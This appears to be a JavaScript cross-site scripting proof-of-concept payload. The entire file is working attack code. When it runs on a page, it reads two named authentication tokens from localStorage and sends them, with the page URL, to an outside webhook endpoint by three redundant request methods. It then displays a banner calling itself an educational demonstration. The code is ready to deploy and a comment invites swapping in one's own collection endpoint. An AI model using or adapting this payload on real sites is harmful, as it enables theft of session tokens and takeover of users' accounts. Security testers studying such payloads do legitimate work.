(function() {
    'use strict';
    
    console.log('üîç XSS PoC--');
    
    // Configuration
    const CONFIG = {
        exfilEndpoint: 'https://webhook.site/c4cda711-716e-4e0d-9c72-7a78515be9d5',  // Replace with your RequestBin URL
        debug: true,
        targetKey: ['QA-CRM_TOKEN', 'QA-MEMBER_MCTOKEN']  // List of keys to exfiltrate
    };

    /**
     * Collect tokens from localStorage
     */
    function collectToken() {
        let tokens = {};
        
        try {
            // Iterate through all target keys
            CONFIG.targetKey.forEach(key => {
                const value = localStorage.getItem(key);
                if (value) {
                    tokens[key] = value;
                    if (CONFIG.debug) {
                        console.log(`üéØ Found ${key}:`, value);
                    }
                } else {
                    if (CONFIG.debug) {
                        console.log(`‚ö†Ô∏è ${key} not found in localStorage`);
                    }
                }
            });
            
            if (CONFIG.debug && Object.keys(tokens).length === 0) {
                console.log('‚ö†Ô∏è No target tokens found in localStorage');
            }
        } catch (e) {
            if (CONFIG.debug) {
                console.error('‚ùå Error accessing localStorage:', e);
            }
        }
        
        return tokens;
    }

    /**
     * Send tokens via POST request
     */
    function sendToken(tokens) {
        const payload = {
            tokens: Object.keys(tokens).length > 0 ? tokens : 'NOT_FOUND',
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
        
        if (CONFIG.debug) {
            console.log(`üì§ Sending POST request to ${CONFIG.exfilEndpoint}`);
            console.log(`üîë Tokens found: ${Object.keys(tokens).length}`);
        }
        
        // Method 1: Using fetch with JSON
        fetch(CONFIG.exfilEndpoint, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(() => {
            if (CONFIG.debug) {
                console.log('‚úÖ POST request sent via fetch (JSON)');
            }
        })
        .catch(err => {
            if (CONFIG.debug) {
                console.log('‚ùå Fetch failed:', err.message);
            }
        });
        
        // Method 2: Using fetch with FormData (backup)
        const formData = new FormData();
        formData.append('tokens', JSON.stringify(tokens));
        formData.append('url', window.location.href);
        formData.append('timestamp', new Date().toISOString());
        
        fetch(CONFIG.exfilEndpoint, {
            method: 'POST',
            mode: 'no-cors',
            body: formData
        })
        .then(() => {
            if (CONFIG.debug) {
                console.log('‚úÖ POST request sent via fetch (FormData)');
            }
        })
        .catch(err => {
            if (CONFIG.debug) {
                console.log('‚ùå FormData fetch failed:', err.message);
            }
        });
        
        // Method 3: Using XMLHttpRequest (backup)
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', CONFIG.exfilEndpoint, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(payload));
            
            if (CONFIG.debug) {
                console.log('‚úÖ POST request sent via XMLHttpRequest');
            }
        } catch (e) {
            if (CONFIG.debug) {
                console.log('‚ùå XMLHttpRequest failed:', e.message);
            }
        }
    }

    /**
     * Create visual alert
     */
    function createVisualAlert(tokens) {
        const alertBox = document.createElement('div');
        alertBox.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #ff4444, #cc0000);
            color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            z-index: 999999;
            font-family: monospace;
            max-width: 350px;
        `;
        
        const tokenCount = Object.keys(tokens).length;
        const tokenList = Object.keys(tokens).map(key => {
            const preview = tokens[key].substring(0, 20) + '...';
            return `<small>${key}: ${preview} (${tokens[key].length} chars)</small>`;
        }).join('<br>');
        
        alertBox.innerHTML = `
            <strong>‚ö†Ô∏è Token Exfiltration Active</strong><br>
            <small>Educational Security Demonstration</small><br>
            <small>Targets: ${CONFIG.targetKey.join(', ')}</small><br>
            <small>Status: ${tokenCount > 0 ? '‚úÖ Captured' : '‚ùå Not Found'}</small><br>
            <small>Found: ${tokenCount} token(s)</small><br>
            ${tokenList || '<small>No tokens found</small>'}<br>
            <small>Method: POST</small><br>
            <button onclick="this.parentElement.remove()" style="margin-top:10px;padding:5px 10px;cursor:pointer;background:#fff;border:none;border-radius:4px;">
                Close
            </button>
        `;
        
        document.body.appendChild(alertBox);
        
        setTimeout(() => {
            if (alertBox.parentElement) {
                alertBox.remove();
            }
        }, 15000);
    }

    /**
     * Main execution
     */
    function execute() {
        console.log('üöÄ Starting Token Exfiltration via POST...');
        
        try {
            // Collect all target tokens
            const tokens = collectToken();
            
            // Send the tokens via POST
            sendToken(tokens);
            
            // Show visual alert
            createVisualAlert(tokens);
            
            console.log('‚úÖ Token exfiltration complete');
            
            if (Object.keys(tokens).length > 0) {
                console.log(`üéØ Successfully captured and sent ${Object.keys(tokens).length} token(s)`);
                Object.keys(tokens).forEach(key => {
                    console.log(`   - ${key}: ${tokens[key].length} chars`);
                });
            } else {
                console.log(`‚ö†Ô∏è No target tokens found in localStorage`);
            }
            
        } catch (error) {
            console.error('‚ùå Error:', error);
        }
    }

    // Execute immediately
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', execute);
    } else {
        execute();
    }

})();
